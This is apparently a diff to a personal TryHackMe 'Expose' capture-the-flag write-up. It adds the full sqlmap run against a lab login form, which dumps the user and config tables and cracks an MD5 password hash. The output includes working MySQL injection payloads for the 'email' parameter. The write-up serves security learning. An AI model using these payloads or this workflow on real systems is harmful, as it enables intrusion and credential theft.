@@ -281,8 +281,172 @@ Finished
 ![](Obsidian%20assets/Exposeadmin_101.png)
 
 > [!info]
->Had to learn how to use sqlmap which led down an interesting path.
+>Had to learn how to use sqlmap which led down an interesting path alongside burpsuite.
+>Essentially I used Burpsuite to capture the request and extract that all into a text file and use the following into sqlmap:
 
 ```
+ ~                                                                               at 16:55:22
+> sqlmap -r /home/reapz786/Downloads/THM\ rooms/exposeadmin.txt --dump                                ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.10.2#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
 
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 17:20:22 /2026-03-01/
+
+[17:20:22] [INFO] parsing HTTP request from '/home/reapz786/Downloads/THM rooms/exposeadmin.txt'
+[17:20:22] [INFO] testing connection to the target URL
+[17:20:22] [INFO] checking if the target is protected by some kind of WAF/IPS
+[17:20:22] [WARNING] request URI is marked as too long by the target. you are advised to try a switch '--no-cast' and/or '--no-escape'
+[17:20:22] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS
+are you sure that you want to continue with further target testing? [Y/n] Y
+[17:20:33] [WARNING] please consider usage of tamper scripts (option '--tamper')
+[17:20:33] [INFO] testing if the target URL content is stable
+[17:20:33] [INFO] target URL content is stable
+[17:20:33] [INFO] testing if POST parameter 'email' is dynamic
+[17:20:33] [INFO] POST parameter 'email' appears to be dynamic
+[17:20:33] [INFO] heuristic (basic) test shows that POST parameter 'email' might be injectable (possible DBMS: 'MySQL')
+[17:20:33] [INFO] heuristic (XSS) test shows that POST parameter 'email' might be vulnerable to cross-site scripting (XSS) attacks
+[17:20:33] [INFO] testing for SQL injection on POST parameter 'email'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[17:20:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[17:20:48] [WARNING] reflective value(s) found and filtering out
+[17:20:48] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[17:20:49] [INFO] testing 'Generic inline queries'
+[17:20:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[17:20:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[17:20:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[17:20:52] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[17:20:54] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[17:20:56] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[17:20:58] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
+[17:21:00] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
+[17:21:02] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[17:21:02] [INFO] POST parameter 'email' appears to be 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable
+[17:21:02] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[17:21:02] [INFO] POST parameter 'email' is 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable
+[17:21:02] [INFO] testing 'MySQL inline queries'
+[17:21:03] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[17:21:03] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[17:21:03] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[17:21:03] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[17:21:03] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[17:21:03] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[17:21:03] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[17:21:13] [INFO] POST parameter 'email' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
+[17:21:13] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[17:21:13] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[17:21:13] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[17:21:13] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[17:21:13] [INFO] target URL appears to have 4 columns in query
+do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
+[17:21:38] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql')
+[17:21:39] [INFO] target URL appears to be UNION injectable with 4 columns
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
+[17:21:41] [INFO] testing 'MySQL UNION query (17) - 21 to 40 columns'
+[17:21:42] [INFO] testing 'MySQL UNION query (17) - 41 to 60 columns'
+[17:21:42] [INFO] testing 'MySQL UNION query (17) - 61 to 80 columns'
+[17:21:43] [INFO] testing 'MySQL UNION query (17) - 81 to 100 columns'
+POST parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 698 HTTP(s) requests:
+---
+Parameter: email (POST)
+    Type: boolean-based blind
+    Title: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: email=hacker@root.thm' AND EXTRACTVALUE(2972,CASE WHEN (2972=2972) THEN 2972 ELSE 0x3A END)-- ICPT&password=root
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: email=hacker@root.thm' AND EXTRACTVALUE(7204,CONCAT(0x5c,0x71706a7671,(SELECT (ELT(7204=7204,1))),0x71717a6b71))-- ygjM&password=root
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: email=hacker@root.thm' AND (SELECT 3836 FROM (SELECT(SLEEP(5)))TTwN)-- eGGa&password=root
+---
+[17:21:48] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (focal or eoan)
+web application technology: Apache 2.4.41
+back-end DBMS: MySQL >= 5.1
+[17:21:49] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[17:21:49] [INFO] fetching current database
+[17:21:49] [INFO] retrieved: 'expose'
+[17:21:49] [INFO] fetching tables for database: 'expose'
+[17:21:49] [INFO] retrieved: 'config'
+[17:21:49] [INFO] retrieved: 'user'
+[17:21:49] [INFO] fetching columns for table 'user' in database 'expose'
+[17:21:49] [INFO] retrieved: 'id'
+[17:21:49] [INFO] retrieved: 'int'
+[17:21:49] [INFO] retrieved: 'email'
+[17:21:49] [INFO] retrieved: 'varchar(512)'
+[17:21:49] [INFO] retrieved: 'password'
+[17:21:49] [INFO] retrieved: 'varchar(512)'
+[17:21:49] [INFO] retrieved: 'created'
+[17:21:49] [INFO] retrieved: 'timestamp'
+[17:21:49] [INFO] fetching entries for table 'user' in database 'expose'
+[17:21:49] [INFO] retrieved: '2023-02-21 09:05:46'
+[17:21:49] [INFO] retrieved: 'hacker@root.thm'
+[17:21:49] [INFO] retrieved: '1'
+[17:21:49] [INFO] retrieved: 'VeryDifficultPassword!!#@#@!#!@#1231'
+Database: expose
+Table: user
+[1 entry]
++----+-----------------+---------------------+--------------------------------------+
+| id | email           | created             | password                             |
++----+-----------------+---------------------+--------------------------------------+
+| 1  | hacker@root.thm | 2023-02-21 09:05:46 | VeryDifficultPassword!!#@#@!#!@#1231 |
++----+-----------------+---------------------+--------------------------------------+
+
+[17:21:49] [INFO] table 'expose.`user`' dumped to CSV file '/home/reapz786/.local/share/sqlmap/output/10.112.163.38/dump/expose/user.csv'
+[17:21:49] [INFO] fetching columns for table 'config' in database 'expose'
+[17:21:49] [INFO] retrieved: 'id'
+[17:21:49] [INFO] retrieved: 'int'
+[17:21:49] [INFO] retrieved: 'url'
+[17:21:49] [INFO] retrieved: 'text'
+[17:21:49] [INFO] retrieved: 'password'
+[17:21:49] [INFO] retrieved: 'text'
+[17:21:49] [INFO] fetching entries for table 'config' in database 'expose'
+[17:21:50] [INFO] retrieved: '/file1010111/index.php'
+[17:21:50] [INFO] retrieved: '1'
+[17:21:50] [INFO] retrieved: '69c66901194a6486176e81f5945b8929'
+[17:21:50] [INFO] retrieved: '/upload-cv00101011/index.php'
+[17:21:50] [INFO] retrieved: '3'
+[17:21:50] [INFO] retrieved: '// ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z'
+[17:21:50] [INFO] recognized possible password hashes in column 'password'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
+do you want to crack them via a dictionary-based attack? [Y/n/q] Y
+[17:22:39] [INFO] using hash method 'md5_generic_passwd'
+what dictionary do you want to use?
+[1] default dictionary file '/opt/sqlmap/data/txt/wordlist.tx_' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+> 1
+[17:23:00] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] N
+[17:23:03] [INFO] starting dictionary-based cracking (md5_generic_passwd)
+[17:23:03] [INFO] starting 12 processes
+[17:23:05] [INFO] cracked password 'easytohack' for hash '69c66901194a6486176e81f5945b8929'
+Database: expose
+Table: config
+[2 entries]
++----+------------------------------+-----------------------------------------------------+
+| id | url                          | password                                            |
++----+------------------------------+-----------------------------------------------------+
+| 1  | /file1010111/index.php       | 69c66901194a6486176e81f5945b8929 (easytohack)       |
+| 3  | /upload-cv00101011/index.php | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z |
++----+------------------------------+-----------------------------------------------------+
+
+[17:23:08] [INFO] table 'expose.config' dumped to CSV file '/home/reapz786/.local/share/sqlmap/output/10.112.163.38/dump/expose/config.csv'
+[17:23:08] [WARNING] HTTP error codes detected during run:
+414 (URI Too Long) - 1 times
+[17:23:08] [INFO] fetched data logged to text files under '/home/reapz786/.local/share/sqlmap/output/10.112.163.38'
+
+[*] ending @ 17:23:08 /2026-03-01/
 ```
+
+> [!note]
+> which led to the following URL with the password easytohac
